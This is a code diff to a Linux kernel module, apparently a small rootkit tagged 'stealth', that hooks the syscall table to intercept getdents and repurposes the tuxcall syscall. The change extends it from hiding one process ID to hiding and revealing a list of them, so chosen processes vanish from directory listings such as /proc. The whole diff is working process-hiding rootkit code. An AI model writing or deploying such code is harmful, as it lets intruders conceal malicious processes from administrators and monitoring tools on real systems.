@@ -12,6 +12,7 @@
 #include <linux/syscalls.h>
 #include <linux/kallsyms.h>
 #include <linux/dirent.h>
+#include <linux/slab.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Josh & RJ");
@@ -22,12 +23,8 @@ MODULE_VERSION("0.1");
 #define SYSCALL_NI __NR_tuxcall
 #define SYSCALL_GD __NR_getdents
 #define TAG "stealth"
-
-static ulong *syscall_table = NULL;
-static void *original_syscall = NULL;
-static void *original_syscall_getdents = NULL;
-static char hidden_pid[16];
-static char buffer[32768];
+#define HIDE 0
+#define REVEAL 1
 
 struct linux_dirent {
     unsigned long d_ino;
@@ -36,20 +33,88 @@ struct linux_dirent {
     char d_name[];
 };
 
+struct hidden_pid_list {
+    char pid_str[16];
+    int pid;
+    struct hidden_pid_list *next;
+};
+
 typedef int (*getdents)(unsigned int, struct linux_dirent *, unsigned int);
 
-static unsigned long lkm_syscall_hide(int pid)
+static ulong *syscall_table = NULL;
+static void *original_syscall = NULL;
+static void *original_syscall_getdents = NULL;
+static char buffer[32768];
+static struct hidden_pid_list list_head;
+
+static int add_to_list(int pid)
 {
-    printk("%s: Hiding PID %i\n", TAG, pid);
-    sprintf(hidden_pid, "%i", pid);
+    struct hidden_pid_list *tail, *new_entry;
+    int string_size;
+
+    tail = &list_head;
+    while (tail->next != NULL) {
+        tail = tail->next;
+    }
+
+    new_entry = (struct hidden_pid_list*)kmalloc(sizeof(struct hidden_pid_list),
+            GFP_KERNEL);
+    if (!new_entry) {
+        printk(KERN_ERR "%s: Failed to allocate memory", TAG);
+        return -ENOMEM;
+    }
+
+    if ((string_size = sprintf(new_entry->pid_str, "%i", pid)) < 0) {
+        printk(KERN_ERR "%s: Failed to convert int to string", TAG);
+        return string_size;
+    }
+
+    new_entry->pid = pid;
+    new_entry->next = NULL;
+    tail->next = new_entry;
+
     return 0;
+}
+
+static int remove_from_list(int pid)
+{
+    struct hidden_pid_list *prev, *curr;
+    prev = &list_head;
+    curr = list_head.next;
+
+    while (curr != NULL && curr->pid != pid) {
+        prev = curr;
+        curr = curr->next;
+    }
+
+    if (curr == NULL) {
+        return -ENOENT;
+    }
+
+    prev->next = curr->next;
+    kfree(curr);
+    return 0;
+}
+
+static int lkm_syscall_hide(int pid, int flag)
+{
+    if (flag == HIDE) {
+        printk(KERN_INFO "%s: Hiding PID %i\n", TAG, pid);
+        return add_to_list(pid);
+    } else if (flag == REVEAL) {
+        printk(KERN_INFO "%s: Revealing PID %i\n", TAG, pid);
+        return remove_from_list(pid);
+    }
+
+    return -EINVAL;
 }
 
 static int lkm_syscall_getdents(unsigned int fd,
         struct linux_dirent *dirp, unsigned int count)
 {
-    int ret, offset;
+    int ret, offset, node_found;
     struct linux_dirent *loc_dirp, *dir;
+    struct hidden_pid_list *pid_node;
     char *offset_buffer;
     void *dest, *src;
     size_t move_amt;
@@ -67,14 +132,24 @@ static int lkm_syscall_getdents(unsigned int fd,
         offset_buffer = ((char*)loc_dirp) + offset;
         dir = (struct linux_dirent *)offset_buffer;
 
-        if (strcmp(hidden_pid, dir->d_name) == 0) {
-            printk("%s: Match to hidden pid %s found", TAG, hidden_pid);
-            ret -= dir->d_reclen;
-            dest = (void *)offset_buffer;
-            src = (void *)(offset_buffer + dir->d_reclen);
-            move_amt = ret - offset;
-            memmove(dest, src, move_amt);
-        } else {
+        pid_node = list_head.next;
+        node_found = 0;
+        while (pid_node != NULL && !node_found) {
+            if (strcmp(pid_node->pid_str, dir->d_name) == 0) {
+                printk("%s: Match to hidden pid %s found", TAG,
+                        pid_node->pid_str);
+                ret -= dir->d_reclen;
+                dest = (void *)offset_buffer;
+                src = (void *)(offset_buffer + dir->d_reclen);
+                move_amt = ret - offset;
+                memmove(dest, src, move_amt);
+                node_found = 1;
+            }
+
+            pid_node = pid_node->next;
+        }
+
+        if (!node_found) {
             offset += dir->d_reclen;
         }
     }
@@ -125,6 +200,9 @@ static void replace_syscall(ulong offset, ulong func_address, void **old_func)
 static int init_syscall(void)
 {
     printk(KERN_INFO "%s: Custom syscall loaded\n", TAG);
+    list_head.pid_str[0] = 0;
+    list_head.pid = -1;
+    list_head.next = NULL;
     replace_syscall(SYSCALL_GD, (ulong)lkm_syscall_getdents,
             &original_syscall_getdents);
     replace_syscall(SYSCALL_NI, (ulong)lkm_syscall_hide,
@@ -134,10 +212,21 @@ static int init_syscall(void)
 
 static void cleanup_syscall(void)
 {
+    struct hidden_pid_list *node, *temp;
+
     page_read_write((ulong)syscall_table);
     syscall_table[SYSCALL_NI] = (ulong)original_syscall;
     syscall_table[SYSCALL_GD] = (ulong)original_syscall_getdents;
     page_read_only((ulong)syscall_table);
+
+    node = list_head.next;
+    list_head.next = NULL;
+    while (node != NULL) {
+        temp = node;
+        node = node->next;
+        kfree(temp);
+    }
+
     printk(KERN_INFO "%s: Custom syscall unloaded\n", TAG);
 }
 
